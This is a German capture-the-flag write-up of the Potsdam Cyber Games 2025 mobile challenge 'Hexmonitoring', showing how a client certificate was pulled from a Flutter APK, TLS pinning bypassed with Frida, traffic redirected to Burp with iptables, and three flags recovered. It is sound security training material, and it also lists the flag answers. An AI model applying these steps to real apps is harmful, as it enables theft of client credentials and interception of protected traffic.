---
title: "PCG 2025: Hexmonitoring — Client-Cert-Theft in einer Flutter-App"
description: "Drei Flags aus einer mTLS-geschützten Flutter-App: Cert-Extraktion aus dem APK, Frida-basierter TLS-Bypass und IPTables-Redirect für Burp."
date: 2026-05-04
category: ctf
tags: [mobile, flutter, android, mtls, frida, burp, ctf]
disclosure: public
---

> **Event:** [Potsdam Cyber Games 2025](https://potsdam-cyber-games.de/) &middot; **Kategorie:** Mobile &middot; **Challenge:** Hexmonitoring &middot; **Flags:** 3 &middot; **Gesamtergebnis:** 1. Platz Schüler-Kategorie

## Was ist PCG?

Die [Potsdam Cyber Games](https://potsdam-cyber-games.de/) sind ein vom
Hasso-Plattner-Institut veranstalteter CTF. 2025 war
die dritte Edition (1. — 29. April), Motto *"Unmask the Underground!"* &mdash;
zweiköpfige Teams infiltrieren eine fiktive Hacker-Organisation namens
*Hexswarm*.

## TL;DR

1. APK auspacken &rarr; Client-Cert + Key liegen unverschlüsselt in `flutter_assets/`
2. Mit dem Cert direkt gegen den mTLS-Endpoint &rarr; **Flag #1**
3. Frida-Script kippt Flutters TLS-Verifikation, IPTables leitet Traffic auf Burp um
4. Burp zeigt zwei zusätzliche, base64-kodierte Endpoints &rarr; **Flag #2** (über HTTP, ungeschützt) und **Flag #3** (zweiter mTLS-Pfad)

## Material

Ausgeliefert wurde nur die APK plus eine IP. Der Domain-Name
`monitoring.hexswarm.com` ergibt sich aus dem Server-Cert.

```bash
$ ls
monitoring-arm64-v8a.apk
```

## Static Analysis

```bash
$ apktool d monitoring-arm64-v8a.apk
```

Ein Blick ins `AndroidManifest.xml` bestätigt: native Flutter-App, einzige
relevante Permission ist `INTERNET`.

```xml
package="de.hpi.pcg.mobile.monitoring"
<uses-permission android:name="android.permission.INTERNET"/>
<activity android:name="de.hpi.pcg.mobile.monitoring.MainActivity" .../>
```

Die eigentliche Logik steckt in `lib/arm64-v8a/libapp.so` (kompilierter
Dart-Snapshot). Strings-Dump zeigt überraschend wenig Verwertbares &mdash;
außer zwei Zeilen, die alles entscheiden:

```bash
$ strings -n 5 lib/arm64-v8a/libapp.so | grep -E "\.pem|\.txt|Monitoring"
assets/client-crt.pem
assets/client-key.pem
flag.txt
Monitoring
```

Die App bringt also **ihren eigenen Client-Cert mit**. Das ist eine klassische
Schwäche bei mTLS auf mobilen Clients: solange die App den Schlüssel kennen
muss, kennt ihn am Ende auch jeder, der die APK in die Hand bekommt.

```bash
$ find . -name "*.pem"
./monitoring-arm64-v8a/assets/flutter_assets/assets/client-crt.pem
./monitoring-arm64-v8a/assets/flutter_assets/assets/client-key.pem

$ mv ./monitoring-arm64-v8a/assets/flutter_assets/assets/client-{crt,key}.pem .
```

## Recon

```bash
$ CHALLENGE_IP=10.72.5.196
$ nmap --top-ports 100 $CHALLENGE_IP -T4
PORT     STATE SERVICE
8080/tcp open  http-proxy
8443/tcp open  https-alt
```

Das Server-Cert auf `8443` zeigt `CN=monitoring.hexswarm.com`. Da das im DNS
nicht auflöst, fake ich den Namen lokal mit `--resolve`.

## Flag #1 — direkter mTLS-Request

Nichts Spektakuläres: extrahiertes Cert + Key gegen `/flag.txt`.

```bash
$ curl -k --cert client-crt.pem --key client-key.pem \
       --resolve "monitoring.hexswarm.com:8443:${CHALLENGE_IP}" \
       https://monitoring.hexswarm.com:8443/flag.txt
```

<details>
<summary>flag #1</summary>

```
PCG{c3rts_4nd_cl13nts::kThUuPFKAPdw}
```

</details>

### Zwischenstand: lokales mTLS-Lab

Bevor ich am echten Server weitergearbeitet habe, habe ich das Setup lokal
nachgebaut: eigene CA per `openssl`, Server-/Client-Pair und ein kurzer
Node-Server, der `requestCert` und `rejectUnauthorized` einzeln umschaltet. Das
Ziel: Fehlerbilder eindeutig zuordnen können. Ein abgewiesener TLS-Handshake
ohne Client-Cert sieht anders aus als ein HTTP 401 nach erfolgreicher
Cert-Validierung &mdash; mit dem Lab sind beide Zustände in zwei Minuten
reproduzierbar, statt am Live-Server raten zu müssen.

## Flag #2 + #3 — Hidden Endpoints

`flag.txt` war zu offensichtlich, also: was ruft die App noch auf? Plan: Traffic
durch Burp leiten und mitlesen. Das Problem: Flutter macht **kein**
System-Proxy-Setting mit, und Flutter pinnt TLS über das gebündelte
[BoringSSL](https://github.com/flutter/engine/tree/main/third_party/boringssl).
Standard-Proxy-Setup reicht also nicht &mdash; ich brauche zwei Tricks:

1. **IPTables**, um den Traffic transparent auf Burp umzubiegen (App glaubt, sie spreche mit dem Server)
2. **Frida-Script**, das Flutters TLS-Verifikation aushebelt, damit das gefälschte Burp-Cert akzeptiert wird

### Burp vorbereiten

```bash
# Client-Cert für Burp ins PKCS#12-Format
$ openssl pkcs12 -export \
    -out client-crt.p12 \
    -inkey client-key.pem \
    -in client-crt.pem \
    -certfile client-crt.pem
```

In Burp:

```
Proxy Settings -> Network -> TLS
  -> Add Client TLS Certificate (client-crt.p12 importieren)

Proxy Settings -> Tools -> Proxy -> Proxy Listeners -> Edit
  Port 8080, Bind to: All interfaces
  Request handling -> Support invisible proxying: ON
```

`Invisible proxying` ist hier essentiell: weil der Traffic über IPTables
umgeleitet wird, kommen die Requests ohne `Host:`-Header in Proxy-Form an.

### Emulator + Frida

App in Android Studio per *Profile or Debug APK* öffnen, dann
[Frida](https://frida.re/docs/android/) im Emulator hochziehen. Anschließend
das fertige NVISO-Script gegen die Flutter-Pinning-Logik:

```bash
$ git clone https://github.com/NVISOsecurity/disable-flutter-tls-verification.git
$ cd disable-flutter-tls-verification
$ frida -U -f de.hpi.pcg.mobile.monitoring -l disable-flutter-tls.js
```

### IPTables-Redirect im Emulator

```bash
$ adb root && adb shell
# 8443 (HTTPS) -> Burp 8080
$ iptables -t nat -A OUTPUT     -p tcp --dport 8443  -j DNAT --to-destination <burp-ip>:8080
# 8080 (HTTP)  -> Burp 8080
$ iptables -t nat -A OUTPUT     -p tcp --dport 8080  -j DNAT --to-destination <burp-ip>:8080
# Source-NAT, damit der Rückweg passt
$ iptables -t nat -A POSTROUTING -p tcp -d <burp-ip> --dport 8080 -j MASQUERADE
```

### Was Burp zeigt

App neu starten &mdash; im Burp-History laufen drei Requests durch:

```
http://${CHALLENGE_IP}:8080/aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ.txt
https://${CHALLENGE_IP}:8443/flag.txt
https://${CHALLENGE_IP}:8443/aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj02bHlvVWU3Q0VZcw.txt
```

Die Pfade sind base64-kodierte YouTube-URLs &mdash; witzig (eine davon
ist tatsächlich ein Rickroll). Interessanter ist die Verteilung:

| Endpoint | Port | mTLS? |
|---|---|---|
| `/flag.txt` | 8443 | **Ja** &mdash; Flag #1 |
| `/aHR…XcQ.txt` | 8080 | **Nein** &mdash; HTTP, keine Auth |
| `/aHR…YYs.txt` | 8443 | **Ja** |

### Flag #2 — über HTTP, ohne Auth

```bash
$ curl http://${CHALLENGE_IP}:8080/aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj1kUXc0dzlXZ1hjUQ.txt
```

<details>
<summary>flag #2</summary>

```
PCG{h1dd3n_1n_pl41n_s1ght::M1fbkGWpuUim}
```

</details>

Der Flag-Name sagt's: ein offener HTTP-Endpoint neben dem mTLS-Server &mdash;
gut versteckt, weil niemand ihn vermutet, solange er den Pfad nicht kennt.

### Flag #3 — zweiter mTLS-Pfad

```bash
$ curl -k --cert client-crt.pem --key client-key.pem \
       --resolve "monitoring.hexswarm.com:8443:${CHALLENGE_IP}" \
       https://monitoring.hexswarm.com:8443/aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g_dj02bHlvVWU3Q0VZcw.txt
```

<details>
<summary>flag #3</summary>

```
PCG{p1nn1ng_p4tch1ng_w1nn1ng::T8kUoJthYat0}
```

</details>

## Tools

- [`apktool`](https://apktool.org/)
- [Frida](https://frida.re/) + [disable-flutter-tls-verification](https://github.com/NVISOsecurity/disable-flutter-tls-verification)
- [Burp Suite Community](https://portswigger.net/burp/communitydownload)
- Android Studio Emulator (rooted system image)
